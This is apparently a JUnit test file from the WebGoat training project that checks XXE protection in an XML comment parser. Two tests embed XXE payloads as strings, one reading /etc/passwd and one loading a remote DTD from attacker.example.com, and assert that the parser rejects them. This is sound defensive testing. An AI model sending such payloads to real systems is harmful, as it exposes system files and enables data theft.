/*
 * SPDX-FileCopyrightText: Copyright © 2017 WebGoat authors
 * SPDX-License-Identifier: GPL-2.0-or-later
 */
package org.owasp.webgoat.lessons.xxe;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import jakarta.xml.bind.JAXBException;
import javax.xml.stream.XMLStreamException;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

/**
 * Tests for {@link CommentsCache#parseXml(String, boolean)} to verify that XXE protection
 * (CWE-611) is applied when securityEnabled=true, and that normal XML parsing works correctly.
 */
class CommentsCacheTest {

  private CommentsCache commentsCache;

  @BeforeEach
  void setUp() {
    commentsCache = new CommentsCache();
  }

  // -------------------------------------------------------------------------
  // Normal XML parsing (no entity injection)
  // -------------------------------------------------------------------------

  @Test
  void parseValidXmlWithSecurityEnabled() throws Exception {
    String xml = "<comment><text>Hello World</text></comment>";
    Comment comment = commentsCache.parseXml(xml, true);
    assertThat(comment.getText()).isEqualTo("Hello World");
  }

  @Test
  void parseValidXmlWithSecurityDisabled() throws Exception {
    // Lesson path: security intentionally disabled
    String xml = "<comment><text>Hello Lesson</text></comment>";
    Comment comment = commentsCache.parseXml(xml, false);
    assertThat(comment.getText()).isEqualTo("Hello Lesson");
  }

  // -------------------------------------------------------------------------
  // XXE protection with securityEnabled=true
  // -------------------------------------------------------------------------

  @Test
  void xxeWithExternalEntityIsBlockedWhenSecurityEnabled() {
    // An XXE payload that declares a DTD with an external file entity.
    // With securityEnabled=true the parser must block DTD processing and throw
    // an exception before the entity can be resolved.
    String xxePayload =
        "<?xml version=\"1.0\" standalone=\"yes\"?>"
            + "<!DOCTYPE comment ["
            + "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"
            + "]>"
            + "<comment><text>&xxe;</text></comment>";

    assertThatThrownBy(() -> commentsCache.parseXml(xxePayload, true))
        .isInstanceOfAny(XMLStreamException.class, JAXBException.class);
  }

  @Test
  void xxeWithParameterEntityInExternalDtdIsBlockedWhenSecurityEnabled() {
    // A blind-XXE-style payload that references an external DTD via a parameter entity.
    String xxePayload =
        "<?xml version=\"1.0\"?>"
            + "<!DOCTYPE comment ["
            + "<!ENTITY % remote SYSTEM \"http://attacker.example.com/evil.dtd\">"
            + "%remote;"
            + "]>"
            + "<comment><text>test</text></comment>";

    assertThatThrownBy(() -> commentsCache.parseXml(xxePayload, true))
        .isInstanceOfAny(XMLStreamException.class, JAXBException.class);
  }

  // -------------------------------------------------------------------------
  // Secure-by-default: properties set even on the !securityEnabled code path
  // (properties are initialised to secure values before any override occurs)
  // -------------------------------------------------------------------------

  @Test
  void internalEntityIsNotExpandedWhenSecurityEnabled() {
    // An internal entity should not cause an exception, but entity expansion that
    // reads an external resource must be blocked.  A plain local entity reference
    // is benign; verify no data from /etc/passwd leaks when securityEnabled=true.
    String localEntityPayload =
        "<?xml version=\"1.0\" standalone=\"yes\"?>"
            + "<!DOCTYPE comment ["
            + "<!ENTITY greeting \"safe-text\">"
            + "]>"
            + "<comment><text>&greeting;</text></comment>";

    // With SUPPORT_DTD=false the DTD block itself should be rejected.
    assertThatThrownBy(() -> commentsCache.parseXml(localEntityPayload, true))
        .isInstanceOfAny(XMLStreamException.class, JAXBException.class);
  }

  // -------------------------------------------------------------------------
  // Malformed XML produces parse error in both modes
  // -------------------------------------------------------------------------

  @Test
  void malformedXmlThrowsExceptionWhenSecurityEnabled() {
    String malformed = "<comment><text>not closed</xml>";
    assertThatThrownBy(() -> commentsCache.parseXml(malformed, true))
        .isInstanceOfAny(XMLStreamException.class, JAXBException.class);
  }

  @Test
  void malformedXmlThrowsExceptionWhenSecurityDisabled() {
    String malformed = "<comment><text>not closed</xml>";
    assertThatThrownBy(() -> commentsCache.parseXml(malformed, false))
        .isInstanceOfAny(XMLStreamException.class, JAXBException.class);
  }
}
